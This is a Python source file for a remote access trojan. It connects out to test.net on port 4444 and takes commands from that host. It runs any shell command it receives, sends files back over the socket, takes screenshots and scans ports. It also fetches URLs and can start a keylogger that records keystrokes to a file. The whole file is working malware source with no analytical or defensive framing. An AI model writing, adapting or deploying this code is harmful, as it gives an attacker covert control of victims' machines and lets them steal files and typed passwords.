import os
import socket
import subprocess
from mss import mss
from pynput.keyboard import Key, Listener
import logging
import requests
host=socket.gethostbyname('test.net')
port=4444
condition=False
e=socket.socket()
s=socket.socket()
condition=True
while condition:
	try:
		s.connect((host,port))
		print("connection is ok")
		condition=False		
	except Exception as e:
		print("connection not ok")
	
		print (e)
		condition=True
while not condition:
	buff=str(s.recv(1048576),encoding='ascii', errors='replace')
	if buff[:2]=='cd':
		try :
			os.chdir(buff[3:])
		except :
			print (" Error to access",end="\n")
			s.send(str("Error to access").encode())

	
	if buff=='screenshot':
		with mss() as sct:
			sct.shot()
	if buff[:3]=='get':
		try:	
			with open(buff[4:],'rb') as file:
				file_data=file.read(90048576)
				s.send(file_data)
		except IOError:
			print("error : File not existe",end="\n")
			s.send(str("error").encode())
		
	if (len(buff)>0 and buff[:3]!='get'):
		try :
			cmd=subprocess.Popen(buff,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			output=str(cmd.stdout.read(),encoding='ascii', errors='ignore')
			currentWD = os.getcwd() + ">"
			s.send(output.encode())
		except :
			print("Error to liste files ",end="\n")
			s.send(str("Error to liste files").encode())
	if buff=='portmap':
		for p in range (1,200):
			if (e.connect_ex((host,p)))==0:
				print("port",p," is open" ,e.recv(1024))
			else:
				print("port",p,"is closed")


		print("Finish")
	if buff=="start_key":
		try:
			log_dir = ""
			logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
			def on_press(key):
				logging.info(key)

			with Listener(on_press=on_press) as listener:
				listener.join()
		except:
			print("start key error")
	if buff=="stop_key":
		try:
			pynput.keyboard.Listener.stop()
		except:
			print("stop listener error")
	if buff[:4]=='http':
		r =requests.get(buff[4:])
		result=r.text
		s.send(result.encode())
